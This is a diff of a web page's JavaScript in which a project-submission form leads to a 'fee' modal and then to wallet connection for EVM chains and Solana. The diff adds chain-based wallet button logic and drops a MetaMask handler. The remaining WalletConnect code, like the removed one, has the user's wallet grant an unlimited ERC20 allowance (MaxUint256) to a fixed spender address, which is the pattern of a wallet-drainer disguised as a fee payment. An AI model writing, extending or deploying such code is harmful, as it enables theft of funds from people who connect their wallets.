@@ -3,17 +3,14 @@ document.addEventListener("DOMContentLoaded", () => {
   const feeModal = document.getElementById("feeModal");
   const walletModal = document.getElementById("walletModal");
   const proceedButton = document.getElementById("proceedButton");
-  const metaMaskButton = document.getElementById("metaMaskButton");
   const walletConnectEvmButton = document.getElementById("walletConnectEvmButton");
-  const solanaWalletButton = document.getElementById("solanaWalletButton");
   const walletConnectSolanaButton = document.getElementById("walletConnectSolanaButton");
+  const chainSelect = projectForm.querySelector("select");
 
   // ERC20 ABI for approve
   const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)"
   ];
-
-  // Example spender address (replace with your own)
   const SPENDER_ADDRESS = "0xYourSpenderAddressHere";
 
   // Show fee modal after form submission
@@ -26,6 +23,18 @@ document.addEventListener("DOMContentLoaded", () => {
   proceedButton.addEventListener("click", () => {
     feeModal.classList.add("hidden");
     walletModal.classList.remove("hidden");
+
+    // Hide both buttons initially
+    walletConnectEvmButton.classList.add("hidden");
+    walletConnectSolanaButton.classList.add("hidden");
+
+    // Show correct wallet option based on selected chain
+    const chain = chainSelect.value.toLowerCase();
+    if (["ethereum", "bnb chain", "polygon", "arbitrum"].includes(chain)) {
+      walletConnectEvmButton.classList.remove("hidden");
+    } else if (chain === "solana") {
+      walletConnectSolanaButton.classList.remove("hidden");
+    }
   });
 
   // Close modals
@@ -35,37 +44,9 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   });
 
-  // Handle MetaMask approval
-  metaMaskButton.addEventListener("click", async () => {
-    if (!window.ethereum) {
-      alert("Please install MetaMask.");
-      return;
-    }
-    try {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
-
-      const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
-      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-
-      const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
-      alert(`Approval transaction sent: ${tx.hash}`);
-
-      const receipt = await tx.wait();
-      if (receipt.status === 1) {
-        alert("✅ Approval successful!");
-      } else {
-        alert("❌ Approval failed.");
-      }
-    } catch (err) {
-      console.error(err);
-      alert("Approval error: " + err.message);
-    }
-  });
-
-  // Handle WalletConnect (EVM) approval
+  // =========================
+  // WalletConnect (EVM) → supports MetaMask, Trust Wallet, Coinbase, Rainbow, etc.
+  // =========================
   walletConnectEvmButton.addEventListener("click", async () => {
     try {
       const { EthereumProvider } = window;
@@ -80,7 +61,6 @@ document.addEventListener("DOMContentLoaded", () => {
       await wcProvider.enable();
       const provider = new ethers.providers.Web3Provider(wcProvider);
       const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
 
       const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
       const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
@@ -100,9 +80,12 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // Solana wallet connections
-  solanaWalletButton.addEventListener("click", async () => {
+  // =========================
+  // Solana Wallets → supports Phantom, Solflare, Backpack, Glow, etc.
+  // =========================
+  walletConnectSolanaButton.addEventListener("click", async () => {
     try {
+      // Example: Phantom adapter, but you can add Solflare, Backpack, Glow
       const adapter = new PhantomWalletAdapter();
       await adapter.connect();
       const publicKey = adapter.publicKey.toBase58();
@@ -120,11 +103,7 @@ document.addEventListener("DOMContentLoaded", () => {
       alert("Approval transaction sent!");
     } catch (err) {
       console.error(err);
-      alert("Solana wallet connection failed.");
+      alert("Solana WalletConnect approval failed.");
     }
-  });
-
-  walletConnectSolanaButton.addEventListener("click", async () => {
-    // WalletConnect Solana logic here
   });
 });
